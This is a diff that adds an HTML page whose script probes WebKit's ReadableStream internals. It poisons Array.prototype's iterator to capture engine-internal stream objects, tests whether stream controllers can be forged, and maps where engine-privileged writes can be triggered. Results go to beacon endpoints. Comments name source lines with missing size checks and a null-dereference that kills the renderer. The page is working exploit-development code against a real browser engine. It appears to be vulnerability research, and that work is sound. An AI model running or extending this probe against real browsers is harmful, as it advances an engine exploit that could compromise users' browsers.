@@ -1,0 +1,168 @@
+<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>FA-v14-DSF — pivot press: CAP-controller gate (CTLX) + trusted-write matrix (0-crash, 6 stages)</title></head>
+<body><script>(function(){try{var x=new XMLHttpRequest();x.open("GET","current.txt",false);x.send(null);var u=(x.responseText||"").trim();if(u&&location.href.indexOf(u.split("?")[0])!==-1&&location.href.indexOf(u)===-1||u&&location.href.indexOf(u.split("?")[0])===-1){location.replace(u);}}catch(e){}})();</script><pre id="out">FA-v14-DSF…</pre><script>
+/* FA-v14-DSF — DSF-PIVOT press (replaces the draft kept at fa-v14-dsf-draft0.html).
+   0-crash by construction:
+   - NO under-fill anywhere: every poisoned iterator yields >= 2 elements. The under-fill read of
+     results[1] (InternalReadableStream.cpp:191-195, ASSERT(size==2) a no-op in release) is the DEAD
+     crash-class family (5/5 wire SEGV) -> deliberately NOT executed here.
+   - NO TransformStream poisoning: TransformStream.cpp:114-119 has the same missing size check PLUS a
+     real jsDynamicCast<...>->wrapped() null-deref => under-fill there is an unconditional renderer kill.
+     Surveyed only (S5), never poisoned.
+   Stages: S0 CAP2 (capture + dispatch + reflection) · S1 CTLX (controller gate matrix + proxy trap count)
+           S2 CAPCHAIN (getReader/tee/pipeTo on CAP vs the X contrast) · S3 STWRITE (state-write + brand
+           negatives) · S4 SPECWRITE (frozen / typed-array / boxed trusted-write matrix) · S5 XFER · Z
+   Beacons: async fetch only (never sync XHR inside a stage), HB 2 s, iterator restored in finally. */
+(function(){
+"use strict";
+var RID="v14"+Date.now().toString(36).slice(-15);
+var out=document.getElementById("out");
+function say(s){try{out.appendChild(document.createTextNode("\n"+s));}catch(e){}}
+function bk(s,b){try{fetch("/beacon/V14-"+s,{method:"POST",cache:"no-store",keepalive:true,headers:{"Content-Type":"application/json"},body:JSON.stringify({r:RID,b:String(b).slice(0,240)})}).catch(function(){});}catch(e){}}
+var OI=Array.prototype[Symbol.iterator];
+function rst(){try{Array.prototype[Symbol.iterator]=OI;}catch(e){}}
+function msg(f){try{f();return "ok";}catch(e){return String((e&&e.message)||e).slice(0,46);}}
+function mk(){var rs=new ReadableStream({});return rs.tee();}
+function poi(arr){Array.prototype[Symbol.iterator]=function(){var i=0;return{next:function(){if(i>=arr.length)return{done:true};var v=arr[i];i++;return{value:v,done:false};}};};}
+var HB=setInterval(function(){bk("HB","hb");},2000);
+bk("L","v14-dsf;dr="+(typeof window.deriveRuntime)+";ua="+navigator.userAgent.slice(0,20));
+
+/* ---------- S0 CAP2: capture the engine's own internal streams (ESC1 S0 corrected) + dispatch + reflection ---------- */
+function s0(){
+  var CAP=null, N=0, T="", L=-1;
+  window.__CAP=null; window.__P=null;
+  Array.prototype[Symbol.iterator]=function(){
+    var t=this; N++;
+    try{ if(CAP===null && t && t.length>=2 && typeof t[0]==="object"){ CAP=[t[0],t[1]]; T=typeof t[0]+"|"+typeof t[1]; L=t.length; } }catch(e0){}
+    var i=0; return {next:function(){ if(i>=2) return {done:true}; var v=t[i]; i++; return {value:v,done:false}; }};
+  };
+  var p=null, e1="", D2=0;
+  try{ var aa=[7,8]; for(var v of aa) D2++; }catch(e2){}      /* D2: is our override consulted in this realm? */
+  try{ p=mk(); }catch(e){ e1=String((e&&e.message)||e).slice(0,46); }
+  rst();
+  window.__CAP=CAP; window.__P=p;
+  var keys="-", syms="-", capT="-", dr="-";
+  try{ keys=Object.keys(CAP[0]).join("|").slice(0,24); }catch(e){ keys="E"; }
+  try{ syms=String(Object.getOwnPropertySymbols(CAP[0]).length); }catch(e){ syms="E"; }
+  try{ capT=typeof CAP[0]; }catch(e){ capT="E"; }
+  try{ dr=typeof window.deriveRuntime; }catch(e){ dr="E"; }
+  bk("S0","N="+N+";D2="+D2+";T="+T+";L="+L+";capT="+capT+";keys=["+keys+"];syms="+syms+";p0="+(p?typeof p[0]:"null")+";same="+(p?String(p[0]===p[1]):"-")+";lock0="+(p?String(p[0].locked):"-")+";dr="+dr+";e="+e1);
+  say("S0 N="+N+" D2="+D2+" T="+T+" capT="+capT+" syms="+syms);
+}
+
+/* ---------- S1 CTLX: the controller gate matrix. The only remaining gate after the `&&` bug is
+       ReadableStreamInternals.js:251 (slot must be EXACTLY null); the proxy row proves no forging. ---------- */
+function s1(){
+  var C=window.__CAP, t=typeof ReadableStreamDefaultController;
+  var g5cap = C? msg(function(){ new ReadableStreamDefaultController(C[0], {}, undefined, 1, 0); }) : "noCAP";
+  var g4cap = C? msg(function(){ new ReadableStreamDefaultController(C[0], {}, undefined, 1); }) : "noCAP";
+  var g5nil = msg(function(){ new ReadableStreamDefaultController({}, {}, undefined, 1, 0); });
+  var g5fun = msg(function(){ new ReadableStreamDefaultController(function(){}, {}, undefined, 1, 0); });
+  var trapN=0, seen="";
+  var pr=new Proxy({}, {
+    getOwnPropertyDescriptor:function(tg,k){ trapN++; try{seen+=typeof k+",";}catch(e){} return {value:null,writable:true,enumerable:true,configurable:true}; },
+    get:function(tg,k){ trapN++; try{seen+=typeof k+",";}catch(e){} return null; },
+    has:function(tg,k){ trapN++; return true; }
+  });
+  var g5pr = msg(function(){ new ReadableStreamDefaultController(pr, {}, undefined, 1, 0); });
+  var rdPr = msg(function(){ new ReadableStreamDefaultReader(pr); });
+  var g5cap2 = "-";
+  if(C){ try{ var r=new ReadableStreamDefaultReader(C[1]); g5cap2=msg(function(){ new ReadableStreamDefaultController(C[1], {}, undefined, 1, 0); }); try{r.releaseLock();}catch(e2){} }catch(e3){ g5cap2="rdE"; } }
+  bk("S1","ctl="+t+";g5cap="+g5cap+";g4cap="+g4cap+";g5nil="+g5nil+";g5fun="+g5fun+";g5pr="+g5pr+";rdPr="+rdPr+";trapN="+trapN+";seen="+seen.slice(0,24)+";g5cap2="+g5cap2);
+  say("S1 "+g5cap+" | "+g4cap+" | "+g5nil+" | pr="+g5pr+" trapN="+trapN);
+}
+
+/* ---------- S2 CAPCHAIN: the §2 falsifier head-to-head — the SAME method works on a CAP-guarded
+       wrapper (globalObject slot present, ReadableStreamInternals.js:52) and fails on an X-guarded one. ---------- */
+function s2(){
+  var P=window.__P, gR="noP", l1="-", rel="noRD", l2="-", teeM="noP", teeL="-", q0l="-", pipe="skip", pl="-";
+  var rd=null;
+  if(P){ try{ rd=P[0].getReader(); gR="ok:"+typeof rd; }catch(e){ gR="E:"+String((e&&e.message)||e).slice(0,44); } }
+  if(P){ try{ l1=String(P[0].locked); }catch(e){ l1="E"; } }
+  if(rd){ try{ rd.releaseLock(); rel="ok"; }catch(e){ rel="E:"+String((e&&e.message)||e).slice(0,28); } }
+  if(P){ try{ l2=String(P[0].locked); }catch(e){ l2="E"; } }
+  if(P){ try{ var q=P[0].tee(); teeM="ok:"+q.length; teeL=String(P[0].locked); q0l=String(q[0].locked); }catch(e){ teeM="E:"+String((e&&e.message)||e).slice(0,40); } }
+  if(P && typeof WritableStream==="function"){
+    try{ var ws=new WritableStream({}); var pp=P[0].pipeTo(ws); pipe=typeof pp; pl=String(P[0].locked); }
+    catch(e){ pipe="E:"+String((e&&e.message)||e).slice(0,36); }
+  }
+  var X={ourTag:"v14s2"}, pX=null, xR="-";
+  try{ poi([X,X]); pX=mk(); }catch(e){}
+  rst();
+  if(pX){ try{ pX[0].getReader(); xR="ok(!!)"; }catch(e){ xR="E:"+String((e&&e.message)||e).slice(0,40); } }
+  bk("S2","gR="+gR+";l1="+l1+";rel="+rel+";l2="+l2+";tee="+teeM+";teeL="+teeL+";q0l="+q0l+";pipe="+pipe+";pl="+pl+";xR="+xR);
+  say("S2 "+gR+" l="+l1+">"+l2+" tee="+teeM+" xR="+xR);
+}
+
+/* ---------- S3 STWRITE: the confirmed trusted write (disturbed/state/reader) on X and on CAP,
+       plus the decisive brand negative: no reachable write produces the controller slot. ---------- */
+function s3(){
+  var X={ourTag:"v14s3"}, pX=null, x0="-", x1="-";
+  try{ poi([X,X]); pX=mk(); }catch(e){}
+  rst();
+  if(pX){ try{ pX[0].cancel(); x0="t"; }catch(e){ x0="E"; } try{ pX[1].cancel(); x1="t"; }catch(e){ x1="E"; } }
+  var C=window.__CAP, c0="-", c1="-", c2="-", lkC="-", ctlAfter="skip";
+  if(C){
+    try{ C[1].cancel(); c0="t"; }catch(e){ c0="E:"+String((e&&e.message)||e).slice(0,26); }
+    try{ C[1].cancel(); c1="t"; }catch(e){ c1="E"; }
+    try{ C[1].cancel(); c2="t"; }catch(e){ c2="E"; }
+    try{ lkC=String(C[1].locked); }catch(e){ lkC="E"; }
+    ctlAfter=msg(function(){ new ReadableStreamDefaultController(C[1], {}, undefined, 1, 0); });
+  }
+  var g5X = pX? msg(function(){ new ReadableStreamDefaultController(X, {}, undefined, 1, 0); }) : "-";
+  var rdX="-";
+  if(pX){ try{ var r=new ReadableStreamDefaultReader(pX[0]); rdX="ctor:"+String(pX[0].locked); try{ r.releaseLock(); }catch(e2){} }catch(e){ rdX="E:"+String((e&&e.message)||e).slice(0,30); } }
+  var g5X2 = pX? msg(function(){ new ReadableStreamDefaultController(X, {}, undefined, 1, 0); }) : "-";
+  bk("S3","x0="+x0+";x1="+x1+";c0="+c0+";c1="+c1+";c2="+c2+";lkC="+lkC+";ctlC="+ctlAfter+";rdX="+rdX+";g5X="+g5X+";g5X2="+g5X2);
+  say("S3 x="+x0+"/"+x1+" cX="+c0+"/"+c1+" g5X="+g5X);
+}
+
+/* ---------- S4 SPECWRITE: does the trusted private write respect JS-level invariants?
+       Oracle: CommonSlowPaths.h:181-203 putDirectWithReify -> canPutDirectFast returns FALSE when
+       !isStructureExtensible() (CommonSlowPaths.h:162-163) => the write falls to methodTable()
+       defineOwnProperty => a strict-mode TypeError on a frozen object (the builtins are "use strict").
+       TA/BX are the controls: extensible, so their write must land silently. ---------- */
+function s4(){
+  var res=[];
+  function probe(tag,obj){
+    var p=null, e="", c="-", lk="-", rd="-", lk2="-", nm="-";
+    try{ poi([obj,obj]); p=mk(); }catch(er){ e=String((er&&er.message)||er).slice(0,32); }
+    rst();
+    if(p){ try{ p[0].cancel(); c="ok"; }catch(er){ c="E:"+String((er&&er.message)||er).slice(0,34); } }
+    if(p){ try{ lk=String(p[0].locked); }catch(er){ lk="E"; } }
+    if(p){ try{ var r=new ReadableStreamDefaultReader(p[0]); rd="ctor"; try{ r.releaseLock(); }catch(e2){} }catch(er){ rd="E:"+String((er&&er.message)||er).slice(0,32); } }
+    if(p){ try{ lk2=String(p[0].locked); }catch(er){ lk2="E"; } }
+    try{ nm=Object.getOwnPropertyNames(obj).join("|").slice(0,30); }catch(er){ nm="E"; }
+    res.push(tag+"{c="+c+";l="+lk+";rd="+rd+";l2="+lk2+";nm=["+nm+"];e="+e+"}");
+  }
+  var Xf=Object.freeze({ourTag:"fz"}); probe("FZ",Xf);
+  var Xt=new Uint8Array(8); Xt.mk="ta"; probe("TA",Xt);
+  var Xb=new Boolean(true); Xb.mk="bx"; probe("BX",Xb);
+  var fz="-"; try{ fz=String(Object.isFrozen(Xf)); }catch(e){ fz="E"; }
+  var ta="-"; try{ ta=Xt.length+"|"+Xt.byteLength+"|"+Xt[0]+"|"+Xt[7]; }catch(e){ ta="E"; }
+  bk("S4","fz="+fz+";ta="+ta+";"+res.join(";"));
+  say("S4 "+res.join(" ; "));
+}
+
+/* ---------- S5 XFER: sibling-surface survey. LEGIT PATH ONLY — the conversion is never poisoned. ---------- */
+function s5(){
+  var t1=typeof TransformStream, t2=typeof TransformStreamDefaultController;
+  var m="-", lr="-", lw="-", dup="-", np="-", tee="-";
+  if(t1==="function"){
+    try{ var ts=new TransformStream({}); m="ok"; lr=typeof ts.readable; lw=typeof ts.writable; dup=String(ts.readable===ts.writable); np=String(Object.getOwnPropertyNames(ts).length);
+      try{ var q=ts.readable.tee(); tee="ok:"+q.length; }catch(e2){ tee="E:"+String((e2&&e2.message)||e2).slice(0,30); }
+    }catch(e){ m="E:"+String((e&&e.message)||e).slice(0,48); }
+  }
+  bk("S5","TS="+t1+";CTL="+t2+";new="+m+";r="+lr+";w="+lw+";dup="+dup+";np="+np+";tee="+tee);
+  say("S5 "+m+" "+tee);
+}
+
+var stages=[s0,s1,s2,s3,s4,s5], i=0;
+(function next(){
+  if(i>=stages.length){ clearInterval(HB); bk("Z","FA-v14-DSF complete; stages="+stages.length); say("Z"); return; }
+  var s=stages[i++];
+  try{ s(); }catch(e){ bk("EX","stage"+i+":"+String((e&&e.message)||e).slice(0,80)); }
+  setTimeout(next,150);
+})();
+})();
+</script></body></html>
